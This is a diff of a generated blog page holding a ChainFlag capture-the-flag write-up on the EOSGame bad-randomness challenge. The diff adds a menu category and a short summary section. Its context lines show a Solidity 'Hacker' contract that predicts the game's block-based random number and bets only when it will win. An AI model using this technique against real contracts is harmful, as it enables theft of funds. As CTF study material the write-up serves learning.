@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1694063332537),
+    lastupdate: new Date(1696680122707),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2443,6 +2443,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
           
                     
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/Foundry/" title="Foundry"
+                  
+                  
+                  
+                    active-action="action-categoriesFoundry"
+                  >
+                  <i class='fa-solid fa-book fa-fw'></i>Foundry
+                </a>
+                
+              </li>
+            
+          
+                    
                   </ul>
                 
               </li>
@@ -2750,6 +2767,23 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
           
                     
+                      
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover"
+                href="/categories/Foundry/" title="Foundry"
+                  
+                  
+                  
+                    active-action="action-categoriesFoundry"
+                  >
+                  <i class='fa-solid fa-book fa-fw'></i>Foundry
+                </a>
+                
+              </li>
+            
+          
+                    
                   </ul>
                 
               </li>
@@ -2995,7 +3029,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：891 字</p>
+      <p>字数：912 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
@@ -3064,6 +3098,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line"></span><br><span class="line">    EOSGame game;</span><br><span class="line">    uint256 MOD_NUM = 20;</span><br><span class="line">    uint bet_counter = 1;</span><br><span class="line"></span><br><span class="line">    constructor(address _game) public &#123;</span><br><span class="line">        game = EOSGame(_game);</span><br><span class="line">        // 类似空投，获取 100 tokens</span><br><span class="line">        game.initFund();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line"></span><br><span class="line">        bet_counter++;</span><br><span class="line"></span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));</span><br><span class="line">        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">        uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line">        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_counter)));</span><br><span class="line">        uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line"></span><br><span class="line">        require(shark == lucky, &quot;shark != luck, try again...&quot;);</span><br><span class="line"></span><br><span class="line">        game.bigBlind();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public &#123;</span><br><span class="line">        game.CaptureTheFlag(&quot;hacker&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2023/08/22/Smart%20contracts/ChainFlag/bad_randomness/bad_randomness/image-20230822184320674.png" alt="image-20230822184320674"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
+<p><em>这道题考察的是随机数的控制，还算比较简单。</em></p>
+</blockquote>
 
   </div>
   
@@ -3335,7 +3372,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#EOSGame"><span class="toc-text">EOSGame</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-question"><span class="toc-text">1. question</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-analysis"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-solve"><span class="toc-text">3. solve</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#EOSGame"><span class="toc-text">EOSGame</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-question"><span class="toc-text">1. question</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-analysis"><span class="toc-text">2. analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-solve"><span class="toc-text">3. solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
     </div>
   </section>
 
